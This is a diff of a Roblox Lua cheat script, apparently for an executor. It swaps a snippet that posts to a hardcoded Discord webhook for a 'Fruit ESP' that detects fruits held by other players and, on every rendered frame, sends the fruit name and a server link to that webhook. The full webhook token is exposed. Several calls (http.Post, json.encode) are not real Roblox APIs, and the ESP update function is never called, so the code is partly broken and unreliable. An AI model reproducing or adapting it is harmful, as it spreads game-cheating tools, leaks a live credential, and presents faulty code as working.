@@ -1,22 +1,103 @@
-local HttpService = game:GetService("HttpService")
-local req = (syn and syn.request) or (http and http.request) or http_request or request
+local Players = game:GetService("Players")  
+local RunService = game:GetService("RunService")  
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local webhook = "https://discord.com/api/webhooks/1406532839905689682/9nCsEZGMpgjbK_gIa15iH3DniuYLHIrBeG5vNo0iXZA65_ehNMhXRFvno1JjhQFPP3gv"
+local FruitESP = Instance.new("ScreenGui")  
+FruitESP.Name = "FruitESP"  
+FruitESP.Parent = Players.LocalPlayer.PlayerGui
 
-local payload = {
-    content = "VoxSeas"
-}
+local Function = Instance.new("Frame")  
+Function.Name = "Function"  
+Function.Parent = FruitESP  
+Function.Size = UDim2.new(0, 300, 0, 200)  
+Function.Position = UDim2.new(0, 0, 0, 0)
 
-if req then
-    pcall(function()
-        req({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
+local Fruits = {"Bomb Fruit", "Buddha Fruit", "Dark Fruit", "Flame Fruit", "Gravity Fruit", "Ice Fruit", "Kilo Fruit", "Light Fruit", "Magma Fruit", "Mirror Fruit", "Rubber Fruit", "Sand Fruit", "Venom Fruit", "Vox Fruit"}
+
+local function UpdateESP()  
+for _, Player in pairs(Players:GetPlayers()) do  
+if Player.Name ~= Players.LocalPlayer.Name then  
+local Character = Player.Character  
+if Character then  
+for _, Child in pairs(Character:GetChildren()) do  
+if table.find(Fruits, Child.Name) and Child:IsA("BasePart") then  
+local ESP = Instance.new("TextLabel")  
+ESP.Name = Child.Name  
+ESP.Parent = Function  
+ESP.Position = UDim2.new(0, 0, 0, 0)  
+ESP.Size = UDim2.new(0, 250, 0, 30)  
+ESP.BackgroundTransparency = 1  
+ESP.Text = Child.Name  
+ESP.TextSize = 20  
+ESP.TextStrokeTransparency = 0  
+end  
+end  
+end  
+end  
+end  
 end
+
+local Label = Instance.new("TextLabel")  
+Label.Name = "Label"  
+Label.Parent = Function  
+Label.Position = UDim2.new(0, 0, 0, 0)  
+Label.Size = UDim2.new(0, 250, 0, 30)  
+Label.BackgroundTransparency = 1  
+Label.Text = "Fruit ESP"  
+Label.TextSize = 20  
+Label.TextStrokeTransparency = 0
+
+local Webhook = "https://discord.com/api/webhooks/1406532839905689682/9nCsEZGMpgjbK_gIa15iH3DniuYLHIrBeG5vNo0iXZA65_ehNMhXRFvno1JjhQFPP3gv"  
+local function SendWebhook(Fruit)  
+local message = "Fruit found: ".. Fruit.. " on server ".. game.PlaceName.. ". Join the server here: ".. "https://www.roblox.com/games/".. game.JobId.. "/"  
+http.Post(Webhook, {json = json.encode({content = message})})  
+end
+
+RunService.RenderStepped:Connect(function()  
+if Function:FindFirstChild("Bomb Fruit") then  
+SendWebhook("Bomb Fruit")  
+end  
+if Function:FindFirstChild("Buddha Fruit") then  
+SendWebhook("Buddha Fruit")  
+end  
+if Function:FindFirstChild("Dark Fruit") then  
+SendWebhook("Dark Fruit")  
+end  
+if Function:FindFirstChild("Flame Fruit") then  
+SendWebhook("Flame Fruit")  
+end  
+if Function:FindFirstChild("Gravity Fruit") then  
+SendWebhook("Gravity Fruit")  
+end  
+if Function:FindFirstChild("Ice Fruit") then  
+SendWebhook("Ice Fruit")  
+end  
+if Function:FindFirstChild("Kilo Fruit") then  
+SendWebhook("Kilo Fruit")  
+end  
+if Function:FindFirstChild("Light Fruit") then  
+SendWebhook("Light Fruit")  
+end  
+if Function:FindFirstChild("Magma Fruit") then  
+SendWebhook("Magma Fruit")  
+end  
+if Function:FindFirstChild("Mirror Fruit") then  
+SendWebhook("Mirror Fruit")  
+end  
+if Function:FindFirstChild("Rubber Fruit") then  
+SendWebhook("Rubber Fruit")  
+end  
+if Function:FindFirstChild("Sand Fruit") then  
+SendWebhook("Sand Fruit")  
+end  
+if Function:FindFirstChild("Venom Fruit") then  
+SendWebhook("Venom Fruit")  
+end  
+if Function:FindFirstChild("Vox Fruit") then  
+SendWebhook("Vox Fruit")  
+end  
+end)  
+
 
 --[[ 
     Pro Chest Collector GUI 
